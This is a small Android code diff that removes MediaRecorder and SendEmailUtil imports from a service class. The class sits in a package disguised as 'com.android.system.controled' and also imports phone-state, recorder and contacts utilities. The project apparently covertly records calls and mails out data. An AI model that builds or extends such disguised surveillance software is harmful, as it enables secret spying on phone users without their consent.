@@ -6,7 +6,6 @@ import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
-import android.media.MediaRecorder;
 import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
 import android.util.Log;
@@ -15,7 +14,6 @@ import com.android.system.controled.util.AudioUtil;
 import com.android.system.controled.util.ContactsUtil;
 import com.android.system.controled.util.FileUtil;
 import com.android.system.controled.util.RecorderUtil;
-import com.android.system.controled.util.SendEmailUtil;
 import com.android.system.controled.util.StringUtil;
 import com.android.system.controled.util.TimeUtil;
 
